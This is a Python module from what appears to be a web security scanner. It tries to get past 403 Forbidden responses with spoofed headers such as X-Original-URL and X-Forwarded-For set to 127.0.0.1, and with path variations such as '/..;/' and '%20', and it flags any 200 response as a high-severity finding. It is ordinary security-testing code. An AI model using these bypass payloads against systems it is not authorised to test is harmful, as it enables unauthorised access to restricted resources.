"""
403 Forbidden Bypass Scanner Module
Attempts to bypass 403 responses using header and path manipulation
Limited attempts per scan to avoid excessive requests
"""

from typing import List, Dict, Any
from urllib.parse import urlparse
from core.base_module import BaseModule
from core.logger import get_logger

logger = get_logger(__name__)


class ForbiddenBypassModule(BaseModule):
    """403 Forbidden bypass scanner"""

    # Class-level counters to limit across instances
    _scan_count = 0
    _tested_urls = set()
    MAX_SCANS = 3

    def __init__(self, module_path: str, payload_limit: int = None):
        """Initialize 403 Bypass module"""
        super().__init__(module_path, payload_limit=payload_limit)

        self.bypass_headers = [
            {'X-Original-URL': '/'},
            {'X-Rewrite-URL': '/'},
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Host': 'localhost'},
            {'X-Originating-IP': '127.0.0.1'},
        ]

        logger.info("403 Forbidden Bypass module loaded")

    def scan(self, targets: List[Dict[str, Any]], http_client: Any) -> List[Dict[str, Any]]:
        """Scan for 403 bypass opportunities"""
        results = []

        for target in targets:
            url = target.get('url')
            parsed = urlparse(url)
            url_key = f"{parsed.netloc}{parsed.path}"

            # Check limits
            if ForbiddenBypassModule._scan_count >= ForbiddenBypassModule.MAX_SCANS:
                break
            if url_key in ForbiddenBypassModule._tested_urls:
                continue

            # First check if URL returns 403
            try:
                baseline = http_client.get(url)
                if not baseline or baseline.status_code != 403:
                    continue  # Only test 403 pages
            except Exception:
                continue

            ForbiddenBypassModule._tested_urls.add(url_key)
            ForbiddenBypassModule._scan_count += 1

            # Test header bypasses
            header_results = self._test_header_bypasses(url, http_client)
            results.extend(header_results)

            # Test path bypasses
            path_results = self._test_path_bypasses(url, http_client)
            results.extend(path_results)

        return results

    def _test_header_bypasses(self, url: str, http_client) -> List[Dict]:
        """Test header-based 403 bypasses"""
        results = []

        for header_dict in self.bypass_headers[:5]:  # Limit tests
            try:
                response = http_client.get(url, headers=header_dict)

                if response and response.status_code == 200:
                    header_name = list(header_dict.keys())[0]
                    header_value = list(header_dict.values())[0]

                    results.append(self.create_result(
                        vulnerable=True,
                        url=url,
                        parameter=header_name,
                        payload=header_value,
                        evidence=f"403 bypassed using header {header_name}: {header_value}",
                        severity='High',
                        method='GET',
                        additional_info={
                            'injection_type': '403 Bypass',
                            'bypass_type': 'Header',
                            'header': header_dict,
                            'cwe': 'CWE-284',
                            'owasp': 'A01:2021',
                            'cvss': 7.5
                        }
                    ))
                    return results  # Found bypass, stop

            except Exception:
                continue

        return results

    def _test_path_bypasses(self, url: str, http_client) -> List[Dict]:
        """Test path-based 403 bypasses"""
        results = []
        parsed = urlparse(url)
        path = parsed.path

        # Path variations
        variations = [
            path + '/',
            path + '/.',
            path + '/./',
            path + '/..;/',
            '/' + path.lstrip('/'),
            path.upper(),
            path + '%20',
            path + '%09',
            path + '?',
            path + '#',
        ]

        base = f"{parsed.scheme}://{parsed.netloc}"

        for var_path in variations[:5]:  # Limit tests
            try:
                test_url = base + var_path
                response = http_client.get(test_url)

                if response and response.status_code == 200:
                    results.append(self.create_result(
                        vulnerable=True,
                        url=test_url,
                        parameter='path',
                        payload=var_path,
                        evidence=f"403 bypassed using path variation: {var_path}",
                        severity='High',
                        method='GET',
                        additional_info={
                            'injection_type': '403 Bypass',
                            'bypass_type': 'Path',
                            'original_path': path,
                            'cwe': 'CWE-284',
                            'owasp': 'A01:2021',
                            'cvss': 7.5
                        }
                    ))
                    return results  # Found bypass, stop

            except Exception:
                continue

        return results


def get_module(module_path: str, payload_limit: int = None):
    """Factory function to create module instance"""
    return ForbiddenBypassModule(module_path, payload_limit)
